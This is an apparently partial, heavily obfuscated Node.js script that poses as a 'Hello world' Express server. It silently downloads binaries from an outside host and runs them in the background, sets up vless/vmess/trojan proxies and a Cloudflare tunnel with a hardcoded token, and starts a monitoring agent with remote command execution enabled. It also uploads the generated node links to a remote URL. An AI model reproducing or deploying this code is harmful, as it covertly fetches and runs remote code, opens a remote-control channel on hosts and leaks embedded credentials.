const _0x2aa434=_0x2885;(function(_0x5f7536,_0x594057){const _0x2072a8={_0x6cf42e:0x12c,_0x133fc4:0xdd,_0x3c35c5:0x144,_0x16262e:0x194,_0x3021ef:0x126,_0x5645c3:0x18c,_0xa5cfce:0xf8},_0x156894=_0x2885,_0x38c4fe=_0x5f7536();while(!![]){try{const _0x151a1f=-parseInt(_0x156894(_0x2072a8._0x6cf42e))/0x1+-parseInt(_0x156894(0xdf))/0x2+parseInt(_0x156894(_0x2072a8._0x133fc4))/0x3*(-parseInt(_0x156894(_0x2072a8._0x3c35c5))/0x4)+parseInt(_0x156894(_0x2072a8._0x16262e))/0x5+-parseInt(_0x156894(_0x2072a8._0x3021ef))/0x6+parseInt(_0x156894(0x103))/0x7*(parseInt(_0x156894(0x171))/0x8)+parseInt(_0x156894(_0x2072a8._0x5645c3))/0x9*(parseInt(_0x156894(_0x2072a8._0xa5cfce))/0xa);if(_0x151a1f===_0x594057)break;else _0x38c4fe['push'](_0x38c4fe['shift']());}catch(_0x309ee4){_0x38c4fe['push'](_0x38c4fe['shift']());}}}(_0x197f,0x49952));const express=require('express'),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require(_0x2aa434(0x189)),{promisify}=require(_0x2aa434(0x106)),exec=promisify(require('child_process')['exec']),{execSync}=require('child_process'),UPLOAD_URL=process[_0x2aa434(0x107)]['UPLOAD_URL']||'',PROJECT_URL=process[_0x2aa434(0x107)][_0x2aa434(0x193)]||'',AUTO_ACCESS=process[_0x2aa434(0x107)]['AUTO_ACCESS']||![],FILE_PATH=process[_0x2aa434(0x107)][_0x2aa434(0x175)]||_0x2aa434(0xeb),SUB_PATH=process[_0x2aa434(0x107)]['SUB_PATH']||_0x2aa434(0x125),PORT=process['env']['SERVER_PORT']||process[_0x2aa434(0x107)][_0x2aa434(0xef)]||0xbb8,UUID=process[_0x2aa434(0x107)]['UUID']||_0x2aa434(0xe2),NEZHA_SERVER=process['env'][_0x2aa434(0x105)]||'youhs.tk:80',NEZHA_PORT=process[_0x2aa434(0x107)][_0x2aa434(0x160)]||'',NEZHA_KEY=process[_0x2aa434(0x107)][_0x2aa434(0x136)]||_0x2aa434(0xe7),ARGO_DOMAIN=process[_0x2aa434(0x107)]['ARGO_DOMAIN']||_0x2aa434(0x109),ARGO_AUTH=process['env']['ARGO_AUTH']||_0x2aa434(0x138),ARGO_PORT=process[_0x2aa434(0x107)]['ARGO_PORT']||0x1f41,CFIP=process[_0x2aa434(0x107)][_0x2aa434(0xfd)]||_0x2aa434(0xec),CFPORT=process[_0x2aa434(0x107)][_0x2aa434(0xe3)]||0x1bb,NAME=process[_0x2aa434(0x107)][_0x2aa434(0xd9)]||'';!fs['existsSync'](FILE_PATH)?(fs['mkdirSync'](FILE_PATH),console[_0x2aa434(0x13e)](FILE_PATH+_0x2aa434(0x184))):console[_0x2aa434(0x13e)](FILE_PATH+'\x20already\x20exists');function generateRandomName(){const _0x360bcc={_0x30dd8d:0x14b,_0xa3a4e1:0x17d,_0x5c663b:0x147},_0x1bcc60=_0x2aa434,_0x139542=_0x1bcc60(_0x360bcc._0x30dd8d);let _0x2d2496='';for(let _0x5c3804=0x0;_0x5c3804<0x6;_0x5c3804++){_0x2d2496+=_0x139542['charAt'](Math[_0x1bcc60(0x124)](Math[_0x1bcc60(_0x360bcc._0xa3a4e1)]()*_0x139542[_0x1bcc60(_0x360bcc._0x5c663b)]));}return _0x2d2496;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x2aa434(0x128)](FILE_PATH,npmName),phpPath=path[_0x2aa434(0x128)](FILE_PATH,phpName),webPath=path[_0x2aa434(0x128)](FILE_PATH,webName),botPath=path['join'](FILE_PATH,botName),subPath=path[_0x2aa434(0x128)](FILE_PATH,'sub.txt'),listPath=path[_0x2aa434(0x128)](FILE_PATH,_0x2aa434(0x18f)),bootLogPath=path[_0x2aa434(0x128)](FILE_PATH,'boot.log'),configPath=path[_0x2aa434(0x128)](FILE_PATH,_0x2aa434(0x12e));function deleteNodes(){const _0x34a41c={_0x3134ed:0x129,_0x45db92:0x112,_0x57063a:0xda,_0x11bcd3:0x112,_0x203ca4:0x16c,_0x426690:0x190,_0x1db376:0x119},_0x43bdb1=_0x2aa434;try{if(!UPLOAD_URL)return;if(!fs[_0x43bdb1(0x114)](subPath))return;let _0x338396;try{_0x338396=fs[_0x43bdb1(_0x34a41c._0x3134ed)](subPath,_0x43bdb1(_0x34a41c._0x45db92));}catch{return null;}const _0x3a8efb=Buffer['from'](_0x338396,_0x43bdb1(_0x34a41c._0x57063a))[_0x43bdb1(0x168)](_0x43bdb1(_0x34a41c._0x11bcd3)),_0x1ec95d=_0x3a8efb[_0x43bdb1(0xf5)]('\x0a')[_0x43bdb1(_0x34a41c._0x203ca4)](_0x24d557=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x43bdb1(0x100)](_0x24d557));if(_0x1ec95d[_0x43bdb1(0x147)]===0x0)return;return axios[_0x43bdb1(_0x34a41c._0x426690)](UPLOAD_URL+_0x43bdb1(_0x34a41c._0x1db376),JSON['stringify']({'nodes':_0x1ec95d}),{'headers':{'Content-Type':'application/json'}})['catch'](_0x1c5972=>{return null;}),null;}catch(_0x2bfd06){return null;}}function cleanupOldFiles(){const _0x75a3b7={_0x27435f:0x11f},_0x861282={_0x54e8e8:0x128,_0x284274:0x133,_0x1a943e:0x118},_0x3ac432=_0x2aa434;try{const _0x46fb76=fs['readdirSync'](FILE_PATH);_0x46fb76[_0x3ac432(_0x75a3b7._0x27435f)](_0x202d5a=>{const _0x532b5f=_0x3ac432,_0x5ff62a=path[_0x532b5f(_0x861282._0x54e8e8)](FILE_PATH,_0x202d5a);try{const _0x1ee45a=fs[_0x532b5f(_0x861282._0x284274)](_0x5ff62a);_0x1ee45a[_0x532b5f(_0x861282._0x1a943e)]()&&fs['unlinkSync'](_0x5ff62a);}catch(_0x16351b){}});}catch(_0xe98ee2){}}app[_0x2aa434(0x143)]('/',function(_0x40a66c,_0x3fd8f2){_0x3fd8f2['send']('Hello\x20world!');});async function generateConfig(){const _0x271ffd={_0xfdbd73:0x111,_0x42a07e:0x135,_0x5b7274:0x18e,_0xd5f9b4:0x153,_0x332e90:0xea,_0x2d0ebf:0x12b,_0x4a37b0:0xed,_0x27c4d7:0x156,_0xa69bfb:0xe9,_0x189dae:0x141,_0x1dd9e0:0x128},_0x44bc6e=_0x2aa434,_0x29a522={'log':{'access':_0x44bc6e(0xf0),'error':_0x44bc6e(0xf0),'loglevel':_0x44bc6e(0x153)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x44bc6e(_0x271ffd._0xfdbd73),'settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':'none','fallbacks':[{'dest':0xbb9},{'path':_0x44bc6e(_0x271ffd._0x42a07e),'dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':_0x44bc6e(0x166)}},{'port':0xbb9,'listen':_0x44bc6e(_0x271ffd._0x5b7274),'protocol':_0x44bc6e(_0x271ffd._0xfdbd73),'settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':'tcp','security':_0x44bc6e(0x153)}},{'port':0xbba,'listen':_0x44bc6e(0x18e),'protocol':'vless','settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x44bc6e(_0x271ffd._0xd5f9b4)},'streamSettings':{'network':'ws','security':_0x44bc6e(0x153),'wsSettings':{'path':_0x44bc6e(_0x271ffd._0x42a07e)}},'sniffing':{'enabled':!![],'destOverride':[_0x44bc6e(0x149),_0x44bc6e(_0x271ffd._0x332e90),_0x44bc6e(0x11d)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x44bc6e(_0x271ffd._0x5b7274),'protocol':_0x44bc6e(0x110),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x44bc6e(0x149),_0x44bc6e(_0x271ffd._0x332e90),_0x44bc6e(0x11d)],'metadataOnly':![]}},{'port':0xbbc,'listen':'127.0.0.1','protocol':_0x44bc6e(0x102),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x44bc6e(_0x271ffd._0x2d0ebf)}},'sniffing':{'enabled':!![],'destOverride':[_0x44bc6e(0x149),_0x44bc6e(0xea),_0x44bc6e(0x11d)],'metadataOnly':![]}}],'dns':{'servers':[_0x44bc6e(_0x271ffd._0x4a37b0)]},'outbounds':[{'protocol':_0x44bc6e(_0x271ffd._0x27c4d7),'tag':_0x44bc6e(0x17b)},{'protocol':_0x44bc6e(_0x271ffd._0xa69bfb),'tag':_0x44bc6e(0x17a)}]};fs[_0x44bc6e(_0x271ffd._0x189dae)](path[_0x44bc6e(_0x271ffd._0x1dd9e0)](FILE_PATH,_0x44bc6e(0x12e)),JSON['stringify'](_0x29a522,null,0x2));}function getSystemArchitecture(){const _0x1034aa={_0x19ed20:0xe1,_0x5b6171:0x113,_0x2295a7:0x14f,_0x3336a4:0x142},_0x5bce48=_0x2aa434,_0x1087c5=os[_0x5bce48(_0x1034aa._0x19ed20)]();return _0x1087c5===_0x5bce48(0x170)||_0x1087c5===_0x5bce48(_0x1034aa._0x5b6171)||_0x1087c5===_0x5bce48(_0x1034aa._0x2295a7)?'arm':_0x5bce48(_0x1034aa._0x3336a4);}function downloadFile(_0xfd57cd,_0x451e7e,_0x507eb4){const _0x4e853e={_0x858763:0x143},_0x1534b1={_0x3abd00:0x122},_0x268476={_0x4c6c4d:0xe5,_0x5c3d4c:0x139},_0x30b3b1=_0x2aa434,_0x348e8c=_0xfd57cd;!fs['existsSync'](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x580f02=fs[_0x30b3b1(0x177)](_0x348e8c);axios({'method':_0x30b3b1(_0x4e853e._0x858763),'url':_0x451e7e,'responseType':'stream'})[_0x30b3b1(0x187)](_0x3d68f6=>{const _0x443a30={_0x3fceb2:0x163,_0x439a3a:0xf1},_0x2fc4e0=_0x30b3b1;_0x3d68f6[_0x2fc4e0(0xff)][_0x2fc4e0(0x127)](_0x580f02),_0x580f02['on'](_0x2fc4e0(0x134),()=>{const _0x397afa=_0x2fc4e0;_0x580f02[_0x397afa(0x151)](),console[_0x397afa(0x13e)]('Download\x20'+path[_0x397afa(_0x443a30._0x3fceb2)](_0x348e8c)+_0x397afa(_0x443a30._0x439a3a)),_0x507eb4(null,_0x348e8c);}),_0x580f02['on'](_0x2fc4e0(0x139),_0x3732b3=>{const _0x46104e=_0x2fc4e0;fs[_0x46104e(_0x268476._0x4c6c4d)](_0x348e8c,()=>{});const _0x13a46a=_0x46104e(0x122)+path['basename'](_0x348e8c)+'\x20failed:\x20'+_0x3732b3[_0x46104e(0xf7)];console[_0x46104e(_0x268476._0x5c3d4c)](_0x13a46a),_0x507eb4(_0x13a46a);});})['catch'](_0xee8f99=>{const _0x3ac0c5=_0x30b3b1,_0x708b1f=_0x3ac0c5(_0x1534b1._0x3abd00)+path[_0x3ac0c5(0x163)](_0x348e8c)+_0x3ac0c5(0x121)+_0xee8f99['message'];console[_0x3ac0c5(0x139)](_0x708b1f),_0x507eb4(_0x708b1f);});}function _0x197f(){const _0x9a934f=['\x20is\x20created','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','\x20is\x20running','then','\x20-p\x20','path','https://arm64.ssss.nyc.mn/web','https://arm64.ssss.nyc.mn/bot','3069585TsfsJX','.exe\x20>\x20nul\x202>&1','127.0.0.1','list.txt','post','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','del\x20/f\x20/q\x20','PROJECT_URL','2822990tEsFda','tunnel.yml','\x0a\x20\x20\x20\x20','Nodes\x20uploaded\x20successfully','send','NAME','base64','\x20>/dev/null\x202>&1\x20&','success','152538woRSHs','Empowerment\x20failed\x20for\x20','645562SWOlXB','text/plain;\x20charset=utf-8','arch','b67e6d39-5b6a-49c7-94ad-986afa188f12','CFPORT','true','unlink','https://ipapi.co/json/','vZeLtIZV9E7BPLBi02YMj7w4cprQuVFE','2096','blackhole','tls','./tmp','cf.090227.xyz','https+local://8.8.8.8/dns-query','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','PORT','/dev/null','\x20successfully','/api/add-nodes','win32','\x20-c\x20\x22','split','tunnel.json','message','20JkjQrP','&path=%2Ftrojan-argo%3Fed%3D2560#','Skipping\x20adding\x20automatic\x20access\x20task','\x0aclient_secret:\x20','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','CFIP','fileUrl','data','test','--tls','trojan','334159htvXTh','\x0a\x20\x20credentials-file:\x20','NEZHA_SERVER','util','env','php\x20running\x20error:\x20','northflank.yhs.de5.net','org','Add\x20automatic\x20access\x20task\x20faild:\x20','stringify','/tunnel.yml\x20run','ArgoDomain:','https://amd64.ssss.nyc.mn/v1','vmess','vless','utf-8','arm64','existsSync','substring','countryCode','&fp=firefox&type=ws&host=','isFile','/api/delete-nodes','response','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','https://oooo.serv00.net/add-url','quic','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','forEach','Empowerment\x20success\x20for\x20','\x20failed:\x20','Download\x20','\x20>/dev/null\x202>&1','floor','sub','1773228VevAdt','pipe','join','readFileSync','config.yaml','/trojan-argo','120522sfNQux','2087','config.json','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','automatic\x20access\x20task\x20added\x20successfully','Error\x20downloading\x20files:','https://amd64.ssss.nyc.mn/web','statSync','finish','/vless-argo','NEZHA_KEY','2053','eyJhIjoiZDU3MzRjMzE1ZDViODNhNTNhNWViNjI3MzViY2QzZjgiLCJ0IjoiMmEyOWJiYWEtMDY0Zi00MWY4LWE5YzEtZjhiMGQ1NmQzNzIzIiwicyI6Ik1EWXdNekJqTmpJdE56Y3dOQzAwTURWakxXSTJPV1V0TlRNeU1qTmpOVGxrT1RsaSJ9','error','Error\x20in\x20startserver:','443','platform','country_code','log','nohup\x20','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','writeFileSync','amd','get','20aAJpYp','from','http\x20server\x20is\x20running\x20on\x20port:','length','unlinkSync','http','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','abcdefghijklmnopqrstuvwxyz','all','?encryption=none&security=tls&sni=','Content-Type','aarch64','charAt','close','application/json','none','chmod','pkill\x20-f\x20\x22[','freedom','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','status','rm\x20-rf\x20','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','match','2083','push','https://amd64.ssss.nyc.mn/bot','NEZHA_PORT','catch','\x0avless://','basename','npm\x20running\x20error:\x20','boot.log','tcp','ARGO_DOMAIN:','toString','?security=tls&sni=','/vmess-argo?ed=2560','pop','filter','\x0a\x20\x20tunnel:\x20','set','Error\x20reading\x20boot.log:','arm','8mrVuEs','https://arm64.ssss.nyc.mn/v1','http://ip-api.com/json/','includes','FILE_PATH','listen','createWriteStream','&path=%2Fvless-argo%3Fed%3D2560#','firefox','block','direct','App\x20is\x20running','random','Unhandled\x20error\x20in\x20startserver:','unshift','taskkill\x20/f\x20/im\x20','fileName','Subscription\x20uploaded\x20successfully','/sub.txt\x20saved\x20successfully'];_0x197f=function(){return _0x9a934f;};return _0x197f();}async function downloadFilesAndRun(){const _0x438d22={_0x3832c4:0x185,_0x5d4f7a:0xf5,_0x34ef78:0x16b,_0x53bd66:0xe8,_0x5c7c8a:0xfc,_0x57247a:0x12f,_0x4a7860:0x141,_0x42d491:0x12a,_0x2fe816:0x11e,_0xfd15a4:0x13e,_0x2f4ba5:0x186,_0x51d3eb:0x139,_0x3040a9:0x108,_0x51323d:0x12d,_0x442ef5:0x15d,_0x8fa929:0x174,_0x578f61:0x101,_0x5bb8e0:0x13f,_0x5ce1b0:0x13e,_0x1b01a5:0x139,_0x5f5098:0x15c,_0x5d060e:0x10d,_0x1cc730:0x14a,_0x1e9bb5:0x13f},_0x1411b9={_0x152b44:0x154},_0x157e98=_0x2aa434,_0x42c82d=getSystemArchitecture(),_0x27d339=getFilesForArchitecture(_0x42c82d);if(_0x27d339[_0x157e98(0x147)]===0x0){console['log'](_0x157e98(_0x438d22._0x3832c4));return;}const _0x1a1fce=_0x27d339['map'](_0x2b09cf=>{const _0x48ab6d={_0x27435b:0x181};return new Promise((_0x38942a,_0x2f017b)=>{const _0x4fdbbd=_0x2885;downloadFile(_0x2b09cf[_0x4fdbbd(_0x48ab6d._0x27435b)],_0x2b09cf[_0x4fdbbd(0xfe)],(_0xaaf3c5,_0x35bf19)=>{_0xaaf3c5?_0x2f017b(_0xaaf3c5):_0x38942a(_0x35bf19);});});});try{await Promise[_0x157e98(0x14c)](_0x1a1fce);}catch(_0x3f9448){console[_0x157e98(0x139)](_0x157e98(0x131),_0x3f9448);return;}function _0x4c2399(_0x90d027){const _0x319a74=0x1fd;_0x90d027['forEach'](_0x2be27c=>{const _0x358e1a={_0x341e16:0xde,_0x592da9:0x13e,_0x38d22e:0x168},_0x2bab95=_0x2885;fs['existsSync'](_0x2be27c)&&fs[_0x2bab95(_0x1411b9._0x152b44)](_0x2be27c,_0x319a74,_0x1b8f05=>{const _0x2eac01=_0x2bab95;_0x1b8f05?console[_0x2eac01(0x139)](_0x2eac01(_0x358e1a._0x341e16)+_0x2be27c+':\x20'+_0x1b8f05):console[_0x2eac01(_0x358e1a._0x592da9)](_0x2eac01(0x120)+_0x2be27c+':\x20'+_0x319a74[_0x2eac01(_0x358e1a._0x38d22e)](0x8));});});}const _0x4d2ab9=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x4c2399(_0x4d2ab9);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x596323=NEZHA_SERVER[_0x157e98(0x174)](':')?NEZHA_SERVER[_0x157e98(_0x438d22._0x5d4f7a)](':')[_0x157e98(_0x438d22._0x34ef78)]():'',_0xeae32c=new Set([_0x157e98(0x13b),'8443',_0x157e98(_0x438d22._0x53bd66),'2087','2083',_0x157e98(0x137)]),_0xc058e0=_0xeae32c['has'](_0x596323)?_0x157e98(0xe4):'false',_0x15f96c=_0x157e98(0xfb)+NEZHA_KEY+_0x157e98(_0x438d22._0x5c7c8a)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0xc058e0+_0x157e98(_0x438d22._0x57247a)+UUID;fs[_0x157e98(_0x438d22._0x4a7860)](path[_0x157e98(0x128)](FILE_PATH,_0x157e98(_0x438d22._0x42d491)),_0x15f96c);const _0x3e1de2=_0x157e98(0x13f)+phpPath+_0x157e98(0xf4)+FILE_PATH+_0x157e98(_0x438d22._0x2fe816);try{await exec(_0x3e1de2),console[_0x157e98(_0x438d22._0xfd15a4)](phpName+_0x157e98(_0x438d22._0x2f4ba5)),await new Promise(_0x269fc1=>setTimeout(_0x269fc1,0x3e8));}catch(_0x3cde47){console[_0x157e98(_0x438d22._0x51d3eb)](_0x157e98(_0x438d22._0x3040a9)+_0x3cde47);}}else{let _0xc42d7b='';const _0x56d674=[_0x157e98(0x13b),'8443',_0x157e98(0xe8),_0x157e98(_0x438d22._0x51323d),_0x157e98(_0x438d22._0x442ef5),_0x157e98(0x137)];_0x56d674[_0x157e98(_0x438d22._0x8fa929)](NEZHA_PORT)&&(_0xc42d7b=_0x157e98(_0x438d22._0x578f61));const _0x3ebf94=_0x157e98(_0x438d22._0x5bb8e0)+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x157e98(0x188)+NEZHA_KEY+'\x20'+_0xc42d7b+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';try{await exec(_0x3ebf94),console[_0x157e98(_0x438d22._0xfd15a4)](npmName+_0x157e98(0x186)),await new Promise(_0x5ed688=>setTimeout(_0x5ed688,0x3e8));}catch(_0x4c00aa){console[_0x157e98(0x139)](_0x157e98(0x164)+_0x4c00aa);}}}else console[_0x157e98(_0x438d22._0x5ce1b0)]('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0x206e90=_0x157e98(_0x438d22._0x5bb8e0)+webPath+'\x20-c\x20'+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x206e90),console['log'](webName+_0x157e98(0x186)),await new Promise(_0x4ebfa1=>setTimeout(_0x4ebfa1,0x3e8));}catch(_0x52e79b){console[_0x157e98(_0x438d22._0x1b01a5)]('web\x20running\x20error:\x20'+_0x52e79b);}if(fs['existsSync'](botPath)){let _0x828104;if(ARGO_AUTH[_0x157e98(_0x438d22._0x5f5098)](/^[A-Z0-9a-z=]{120,250}$/))_0x828104=_0x157e98(0x158)+ARGO_AUTH;else ARGO_AUTH[_0x157e98(0x15c)](/TunnelSecret/)?_0x828104='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+_0x157e98(_0x438d22._0x5d060e):_0x828104=_0x157e98(_0x438d22._0x1cc730)+FILE_PATH+_0x157e98(0xee)+ARGO_PORT;try{await exec(_0x157e98(_0x438d22._0x1e9bb5)+botPath+'\x20'+_0x828104+'\x20>/dev/null\x202>&1\x20&'),console['log'](botName+_0x157e98(0x186)),await new Promise(_0x555217=>setTimeout(_0x555217,0x7d0));}catch(_0x24bd4a){console[_0x157e98(0x139)]('Error\x20executing\x20command:\x20'+_0x24bd4a);}}await new Promise(_0x185911=>setTimeout(_0x185911,0x1388));}function _0x2885(_0x47201a,_0x44ad63){const _0x197fe9=_0x197f();return _0x2885=function(_0x2885a7,_0x2fdeda){_0x2885a7=_0x2885a7-0xd7;let _0xdbdee3=_0x197fe9[_0x2885a7];return _0xdbdee3;},_0x2885(_0x47201a,_0x44ad63);}function getFilesForArchitecture(_0x322455){const _0x19398b={_0x4ed1df:0x18b,_0x42ed66:0x17f,_0x19bb49:0x172,_0x2ff2aa:0x10f,_0x1e504e:0x17f},_0x5031d4=_0x2aa434;let _0x52639c;_0x322455===_0x5031d4(0x170)?_0x52639c=[{'fileName':webPath,'fileUrl':_0x5031d4(0x18a)},{'fileName':botPath,'fileUrl':_0x5031d4(_0x19398b._0x4ed1df)}]:_0x52639c=[{'fileName':webPath,'fileUrl':_0x5031d4(0x132)},{'fileName':botPath,'fileUrl':_0x5031d4(0x15f)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x4a6172=_0x322455===_0x5031d4(0x170)?'https://arm64.ssss.nyc.mn/agent':'https://amd64.ssss.nyc.mn/agent';_0x52639c[_0x5031d4(_0x19398b._0x42ed66)]({'fileName':npmPath,'fileUrl':_0x4a6172});}else{const _0x3c524b=_0x322455===_0x5031d4(0x170)?_0x5031d4(_0x19398b._0x19bb49):_0x5031d4(_0x19398b._0x2ff2aa);_0x52639c[_0x5031d4(_0x19398b._0x1e504e)]({'fileName':phpPath,'fileUrl':_0x3c524b});}}return _0x52639c;}function argoType(){const _0x3e8828={_0x281924:0xf6,_0x5adbb6:0x104,_0x5cdd6c:0x128,_0x29a405:0xf6,_0x3ab064:0x140,_0x505dc7:0x157},_0x25de82=_0x2aa434;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x25de82(0x13e)](_0x25de82(0x15b));return;}if(ARGO_AUTH['includes']('TunnelSecret')){fs[_0x25de82(0x141)](path[_0x25de82(0x128)](FILE_PATH,_0x25de82(_0x3e8828._0x281924)),ARGO_AUTH);const _0x49cdc8=_0x25de82(0x16d)+ARGO_AUTH['split']('\x22')[0xb]+_0x25de82(_0x3e8828._0x5adbb6)+path[_0x25de82(_0x3e8828._0x5cdd6c)](FILE_PATH,_0x25de82(_0x3e8828._0x29a405))+_0x25de82(_0x3e8828._0x3ab064)+ARGO_DOMAIN+_0x25de82(_0x3e8828._0x505dc7)+ARGO_PORT+_0x25de82(0x11b);fs[_0x25de82(0x141)](path[_0x25de82(0x128)](FILE_PATH,_0x25de82(0x195)),_0x49cdc8);}else console[_0x25de82(0x13e)](_0x25de82(0x191));}async function extractDomains(){const _0xc13b13={_0x2cc4a5:0x167,_0x5cf402:0x165,_0x3be715:0x11f,_0x541324:0x128,_0x17a0fa:0xee,_0x38aa58:0x13f,_0x38f9cd:0xdb,_0x3612b8:0x186,_0xa8c052:0x139},_0x17f2b0={_0x38effb:0x143,_0x335675:0xe6,_0x5b808c:0x10a,_0x376fcc:0xff,_0x591c78:0x13d,_0xac604e:0xff,_0xc2b147:0x143,_0x29e62b:0xdc,_0x25b037:0xff,_0x231503:0xff},_0x201c65={_0x2d3239:0x13c,_0x31888d:0x180,_0x1d5d54:0x18d,_0x39647f:0x155,_0x22bae3:0x150,_0x18935f:0x115},_0x2f23f5=_0x2aa434;let _0x566a06;if(ARGO_AUTH&&ARGO_DOMAIN)_0x566a06=ARGO_DOMAIN,console[_0x2f23f5(0x13e)](_0x2f23f5(_0xc13b13._0x2cc4a5),_0x566a06),await _0x513f5c(_0x566a06);else try{const _0x5eb7a8=fs[_0x2f23f5(0x129)](path[_0x2f23f5(0x128)](FILE_PATH,_0x2f23f5(_0xc13b13._0x5cf402)),_0x2f23f5(0x112)),_0x3e8bf4=_0x5eb7a8['split']('\x0a'),_0x53093d=[];_0x3e8bf4[_0x2f23f5(_0xc13b13._0x3be715)](_0x2acc56=>{const _0x2dacd9=_0x2f23f5,_0x33ae21=_0x2acc56[_0x2dacd9(0x15c)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x33ae21){const _0x5db32d=_0x33ae21[0x1];_0x53093d[_0x2dacd9(0x15e)](_0x5db32d);}});if(_0x53093d['length']>0x0)_0x566a06=_0x53093d[0x0],console[_0x2f23f5(0x13e)](_0x2f23f5(0x10e),_0x566a06),await _0x513f5c(_0x566a06);else{console['log']('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs[_0x2f23f5(0x148)](path[_0x2f23f5(_0xc13b13._0x541324)](FILE_PATH,_0x2f23f5(0x165)));async function _0x31e427(){const _0x380e55=_0x2f23f5;try{process[_0x380e55(_0x201c65._0x2d3239)]===_0x380e55(0xf3)?await exec(_0x380e55(_0x201c65._0x31888d)+botName+_0x380e55(_0x201c65._0x1d5d54)):await exec(_0x380e55(_0x201c65._0x39647f)+botName[_0x380e55(_0x201c65._0x22bae3)](0x0)+']'+botName[_0x380e55(_0x201c65._0x18935f)](0x1)+'\x22\x20>\x20/dev/null\x202>&1');}catch(_0x2472a2){}}_0x31e427(),await new Promise(_0x135352=>setTimeout(_0x135352,0xbb8));const _0x18964c=_0x2f23f5(0x14a)+FILE_PATH+_0x2f23f5(_0xc13b13._0x17a0fa)+ARGO_PORT;try{await exec(_0x2f23f5(_0xc13b13._0x38aa58)+botPath+'\x20'+_0x18964c+_0x2f23f5(_0xc13b13._0x38f9cd)),console[_0x2f23f5(0x13e)](botName+_0x2f23f5(_0xc13b13._0x3612b8)),await new Promise(_0x55c971=>setTimeout(_0x55c971,0xbb8)),await extractDomains();}catch(_0x239b6f){console[_0x2f23f5(0x139)]('Error\x20executing\x20command:\x20'+_0x239b6f);}}}catch(_0x183afb){console[_0x2f23f5(_0xc13b13._0xa8c052)](_0x2f23f5(0x16f),_0x183afb);}async function _0xcd6a01(){const _0x33f81c=_0x2f23f5;try{const _0x233064=await axios[_0x33f81c(_0x17f2b0._0x38effb)](_0x33f81c(_0x17f2b0._0x335675),{'timeout':0xbb8});if(_0x233064[_0x33f81c(0xff)]&&_0x233064[_0x33f81c(0xff)]['country_code']&&_0x233064['data'][_0x33f81c(_0x17f2b0._0x5b808c)])return _0x233064[_0x33f81c(_0x17f2b0._0x376fcc)][_0x33f81c(_0x17f2b0._0x591c78)]+'_'+_0x233064[_0x33f81c(_0x17f2b0._0xac604e)][_0x33f81c(_0x17f2b0._0x5b808c)];}catch(_0x5db132){try{const _0x10a8b1=await axios[_0x33f81c(_0x17f2b0._0xc2b147)](_0x33f81c(0x173),{'timeout':0xbb8});if(_0x10a8b1[_0x33f81c(0xff)]&&_0x10a8b1[_0x33f81c(0xff)][_0x33f81c(0x159)]===_0x33f81c(_0x17f2b0._0x29e62b)&&_0x10a8b1[_0x33f81c(0xff)]['countryCode']&&_0x10a8b1[_0x33f81c(_0x17f2b0._0x25b037)]['org'])return _0x10a8b1[_0x33f81c(_0x17f2b0._0x231503)][_0x33f81c(0x116)]+'_'+_0x10a8b1[_0x33f81c(0xff)][_0x33f81c(0x10a)];}catch(_0x46b8ff){}}return'Unknown';}async function _0x513f5c(_0x2235de){const 